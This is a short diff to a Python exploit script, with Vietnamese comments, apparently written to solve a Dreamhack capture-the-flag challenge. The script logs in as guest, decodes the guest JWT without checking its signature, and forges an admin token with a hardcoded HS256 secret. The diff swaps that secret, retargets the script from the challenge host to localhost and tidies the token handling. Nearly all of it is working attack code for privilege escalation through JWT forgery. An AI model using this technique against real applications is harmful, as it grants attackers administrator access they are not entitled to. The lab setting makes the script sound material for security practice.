@@ -6,7 +6,7 @@ class Exploit:
     def __init__(self, baseURL):
         self.baseURL = baseURL.rstrip("/")
         self.guest_token = None
-        self.jwt_key = "rGPGTRvizFHqOpLRMNJbqmXlycZtQZbTvJnWdKyRJZDxwqIDEi"
+        self.jwt_key = "FwlxuFDeSeDXDSKsMwWilMTNCqyPwJCzTScahtGBvxAIpNxtqg"
         self.admin_token = None
         self.username = "guest"
         self.password = "guest"
@@ -26,7 +26,11 @@ class Exploit:
     def decode_jwt_guest(self):
         if not self.guest_token:
             raise RuntimeError("Chưa có guest token.")
-        payload = jwt.decode(self.guest_token, options={"verify_signature": False})
+        payload = jwt.decode(
+            self.guest_token,
+            options={"verify_signature": False},
+            algorithms=["HS256"]
+        )
         print(f"[+] Guest Token Payload:", payload, "\n")
         return payload
 
@@ -39,7 +43,8 @@ class Exploit:
             raise RuntimeError("Chưa có JWTKey để ký.")
         payload = {"id": "admin", "isAdmin": True}
         token = jwt.encode(payload, self.jwt_key, algorithm="HS256")
-        if not isinstance(token, str):
+        # Đảm bảo token luôn là string
+        if isinstance(token, bytes):
             token = token.decode()
         self.admin_token = token
         print(f"[+] Admin JWT: {self.admin_token}\n")
@@ -81,7 +86,7 @@ class Exploit:
 
 
 if __name__ == "__main__":
-    BASE_URL = "http://host8.dreamhack.games:11305"
+    BASE_URL = "http://127.0.0.1:13000"
     exploit = Exploit(BASE_URL)
     exploit.login()
     exploit.decode_jwt_guest()
